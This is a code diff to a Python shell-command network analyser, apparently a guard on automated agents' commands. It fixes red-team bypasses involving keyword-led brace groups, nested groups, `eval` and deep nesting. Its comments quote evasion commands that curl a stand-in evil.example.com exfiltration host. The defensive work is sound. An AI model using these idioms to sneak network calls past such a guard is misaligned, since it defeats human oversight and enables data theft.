@@ -902,7 +902,21 @@ def _find_function_bodies(cmd):
 # function-def path uses: `{ curl -H @- -s http://localhost:3420/api/kanban; }` is this fleet's own
 # dominant idiom (96.7% of the corpus's network calls are localhost, see the module docstring) and
 # must come back with ZERO findings, not a blanket "hides a network command" block.
-_BARE_GROUP_OPEN_RX = re.compile(r"(?:\A|[;\n|&(])\s*\{(?=\s)")
+#
+# Card 7e01b349 (RedHat F1b on fcd8b794/14102): the punctuation-only lookbehind missed a `{` that
+# opens a command LIST position reached through a shell keyword instead of punctuation --
+# `if true; then { curl ...; }; fi`, `for x; do { curl ...; }; done`, `else { curl ...; }`,
+# `! { curl ...; }`, `time { curl ...; }` were all ALLOW because "then "/"do "/"else "/"! "/"time "
+# precede the brace, not `;`/newline/`|`/`&`/`(`. Reproduced and fixed by also accepting a `{`
+# preceded by one of those keywords (word boundary, so e.g. a variable literally named `thething`
+# does not false-match). Deliberately NOT adding `)` to the punctuation class even though
+# `case x in x) { curl ...; };; esac` has the same gap: a bare `)` also ends a function
+# DEFINITION's parameter list (`f(){ ... }`), which this scan must never match (see the big
+# comment above -- that double-fire was already tried and reverted once). Fixing the case-pattern
+# shape needs its own, narrower lookbehind that can tell the two `)` apart; left open, not blocked
+# on here.
+_BARE_GROUP_OPEN_RX = re.compile(
+    r"(?:\A|[;\n|&(]|\b(?:then|do|else|elif|while|until|time)\b|(?<!\S)!)\s*\{(?=\s)")
 
 
 def _find_bare_brace_group_bodies(cmd):
@@ -945,6 +959,17 @@ def _looks_network_capable(text):
                 return True
     for sub in nested:
         if _looks_network_capable(sub):
+            return True
+    # Card 7e01b349 (RedHat NO-GO on 80c80706, F1b): a bare brace group NESTED INSIDE a function
+    # body -- `f() { { curl "$1"; }; }` -- was invisible here. The body text handed in is
+    # `{ curl "$1"; }`; tokenize() has no separator for `{`, so its own "command name" reads as
+    # the literal word "{" (see _find_bare_brace_group_bodies's own docstring for why that is true
+    # of this tokenizer generally), and the curl behind it was never reached by the segment loop
+    # above. Measured pre-fix: `f() { { curl "$1"; }; }; f https://evil.example.com/k` passed with
+    # zero findings. Reusing the dedicated bare-group finder (already proven correct for the
+    # top-level/nested-substitution case in analyse()) closes the same gap here.
+    for brace_body in _find_bare_brace_group_bodies(text):
+        if _looks_network_capable(brace_body):
             return True
     return False
 
@@ -1082,6 +1107,18 @@ def _judge_segment_body(seg, allowed, findings, depth, hatch=None):
     if name in DIRECT_NET:
         _judge_hostport_command(name, seg, idx, allowed, findings)
         return
+    if name == "eval":
+        # Card 7e01b349 (RedHat NO-GO on 80c80706, F1b): `eval` was not handled at all -- its
+        # operand is bash CODE (eval concatenates its arguments with a space and executes the
+        # result), so `eval "curl -s http://evil.example.com/exfil"` and
+        # `eval '{ curl -s http://evil.example.com/exfil; }'` both passed with zero findings,
+        # same as `bash -c` would have if SHELLS didn't special-case it (see that branch below).
+        # Fixed the same way: hand the joined operand text back into analyse() at depth+1, so a
+        # bare-group curl inside the eval'd string is also caught by that recursive pass.
+        parts = [w.text for w in seg[idx + 1:] if not w.redirect]
+        if parts:
+            findings.extend(analyse(" ".join(parts), allowed, depth=depth + 1, hatch=hatch))
+        return
     if name in INTERPRETERS:
         script = _interpreter_script(seg, idx, name)
         if script is None:
@@ -1134,8 +1171,17 @@ def analyse(raw, allowed, depth=0, hatch=None):
     substitutions) -- see analyse_segment's docstring for why this is a separate channel from the
     return value."""
     findings = []
-    if depth > 3:  # a substitution chain this deep is pathological; stop rather than recurse away
-        return findings
+    if depth > 3:
+        # Card 7e01b349 (RedHat F1b on fcd8b794/14102): a nesting chain this deep (substitution OR
+        # bare-brace-group, both recurse through this same guard) is pathological either way, but
+        # returning EMPTY here was fail-OPEN -- `{ { { { curl ...; } ... } ... } ... }` at 4+ levels
+        # came back with zero findings, same as running outside the guard entirely. A command this
+        # deeply nested has no legitimate shape in this fleet's corpus (the measured cases are all
+        # adversarial depth-padding to walk past the limit), so stopping the recursion now emits a
+        # finding instead of silently dropping it.
+        return [Finding(UNKNOWN, "<nesting>", [],
+                        "a beagyazas (helyettesites vagy { } csoport) melysege meghaladja az "
+                        "elemzesi hatart, fail-closed")]
     try:
         segments, nested = tokenize(strip_heredoc_bodies(raw))
     except Exception:
